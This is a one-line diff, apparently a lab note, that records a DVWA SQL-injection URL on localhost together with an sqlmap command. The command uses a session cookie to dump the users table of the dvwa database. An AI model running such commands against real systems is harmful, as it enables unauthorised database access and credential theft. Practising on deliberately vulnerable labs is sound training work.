@@ -1,0 +1,1 @@
+http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=security=low; PHPSESSID=fee166g7ntc9unraa6ukc60rj7" -D dvwa -T users --dump
